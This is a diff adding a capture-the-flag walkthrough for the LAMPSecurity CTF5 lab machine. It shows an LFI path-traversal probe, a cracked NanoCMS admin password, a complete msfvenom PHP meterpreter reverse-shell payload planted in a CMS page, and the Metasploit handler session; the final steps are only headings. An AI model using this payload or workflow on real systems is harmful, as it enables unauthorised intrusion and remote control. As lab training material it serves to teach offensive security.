@@ -1,0 +1,66 @@
+LAMPSecurity: CTF5
+-------------------
+
+1. Network Scanning (Nmap, netdiscover)
+	netdiscover -i vmnet8
+	nmap -A -p- 192.168.126.131
+		multiple ports opened
+		as HTTP service also running
+
+2. HTTP service enumeration
+	LFI/RFI vulnerability may be possible
+	http://192.168.126.131/index.php?page=../../../../etc/passwd%00
+
+3. identifying exploit for the vulnerable CMS Web application
+	when click on Blog tab it will redirect to the URL http://192.168.126.131/~andy/
+	I saw that the site is powered by NanoCMS
+	vulnerability exploit: https://www.securityfocus.com/bid/34508/exploit
+		The possible vulnerability identified is Password Hash Information Disclosure which allows unrestricted access to the path /data/pagesdata.txt
+		I found that the Admin password hash is retrieved
+		s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";
+		password cracked successfully using https://crackstation.net/
+		password is : shannon
+		
+4. Access CMS admin login page & credentials
+	http://192.168.126.131/~andy/data/nanoadmin.php
+	login with username: admin, password: shannon
+	Login successful
+	Now create new page
+
+5. Generate PHP Backdoor (msfvenom)
+	┌──(cr4ck3r㉿Zero2Hero)-[~]
+	└─$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.126.1 lport=4444 -f raw
+	[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+	[-] No arch selected, selecting arch: php from the payload
+	No encoder specified, outputting raw payload
+	Payload size: 1114 bytes
+	/*<?php /**/ error_reporting(0); $ip = '192.168.126.1'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+
+6. Upload and execute the backdoor
+	paste under Content section of Add new Page and save
+	go on http://192.168.126.131/~andy/index.php
+	click on shell link
+
+7. Reverse connection (Metasploit)
+	msf6 > use exploit/multi/handler
+	[*] Using configured payload generic/shell_reverse_tcp
+	msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+	payload => php/meterpreter/reverse_tcp
+	msf6 exploit(multi/handler) > set lhost 192.168.126.1
+	lhost => 192.168.126.1
+	msf6 exploit(multi/handler) > set lport 4444
+	lport => 4444
+	msf6 exploit(multi/handler) > exploit
+
+	[*] Started reverse TCP handler on 192.168.126.1:4444 
+	[*] Sending stage (39282 bytes) to 192.168.126.131
+	[*] Meterpreter session 1 opened (192.168.126.1:4444 -> 192.168.126.131:49418) at 2021-06-08 00:49:02 +0530
+
+	meterpreter > 
+
+8. Import python one-liner for proper TTY shell
+	python -c 'import pty;pty.spawn("/bin/bash")'
+
+9. Exploiting target (exploit 9479)
+
+10. Get the Root access
